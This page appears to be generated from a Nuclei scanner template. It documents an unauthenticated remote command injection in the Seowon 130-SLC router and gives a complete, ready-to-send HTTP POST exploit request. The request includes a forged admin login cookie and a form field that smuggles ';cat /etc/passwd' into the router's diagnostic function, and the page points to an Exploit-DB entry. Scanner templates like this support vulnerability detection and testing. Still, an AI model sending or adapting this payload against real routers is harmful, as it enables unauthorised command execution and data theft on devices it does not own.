# Nuclei Template: Seowon 130-SLC router - Remote Code Execution
**Template ID:** seowon-router-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`seowon-router-rce.yaml`)

## Vulnerability Information & PoC

## Description
Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the router ip & Port(if available) in the request.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/diagnostic.html?t=201701020919
Cookie: product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin

Command=Diagnostic&traceMode=trace&reportIpOnly=0&pingPktSize=56&pingTimeout=30&pingCount=4&ipAddr=&maxTTLCnt=30&queriesCnt=;cat /etc/passwd&reportIpOnlyCheckbox=on&btnApply=Apply&T=1631653402928
```

## References
- https://www.exploit-db.com/exploits/50295
